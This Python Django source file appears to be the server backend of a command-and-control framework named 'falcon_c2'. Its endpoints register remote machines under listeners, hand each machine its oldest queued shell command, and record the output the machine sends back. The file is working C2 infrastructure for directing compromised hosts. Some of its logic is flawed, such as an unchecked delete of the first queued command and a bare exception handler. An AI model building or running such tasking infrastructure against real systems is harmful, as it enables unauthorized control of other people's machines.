from rest_framework.decorators import api_view
from rest_framework.response import Response
from app_team.views import generate_id
from falcon_c2.views import *
from .serializers import *
from app_team.models import *
from .models import *


@api_view(["POST"])
def create_connection(request):
    listener_id = request.data.get("listener_id")

    if Listeners.objects.filter(listener_id=listener_id).exists():
        machine_id = generate_id(Connections, "machine_id")

        data = request.data.copy()
        data["machine_id"] = machine_id

        serializer = ConnectionsSerializer(data=data)

        if serializer.is_valid():
            serializer.save()

            return Response({"machine_id": machine_id})


@api_view(["POST"])
def update_connection(request, machine_id):
    data = request.data.copy()
    data["machine_id"] = machine_id

    if Connections.objects.filter(machine_id=machine_id).exists():
        connection = Connections.objects.get(machine_id=machine_id)
        serializer = ConnectionsSerializer(instance=connection, data=request.data)

        if serializer.is_valid():
            serializer.save()

        return Response({"machine_id": machine_id})


@api_view(["POST"])
def manage_connection(request, machine_id):
    try:
        output = request.data.get("output")

        command_pool = CommandPool.objects.filter(machine_id=machine_id).order_by(
            "timestamp"
        )

        if output:
            connection = Connections.objects.get(machine_id=machine_id)
            listener_id = connection.listener_id

            if Listeners.objects.filter(listener_id=listener_id).exists():
                serializer = CommandHistorySerializer(data=request.data)

                if serializer.is_valid():
                    serializer.save()

        oldest_command = command_pool.first()

        command_pool.first().delete()

        if oldest_command:
            command = oldest_command.command
            return Response({"command": command})
        else:
            return Response({"command": ""})

    except Exception as e:
        return Response({"command": ""})
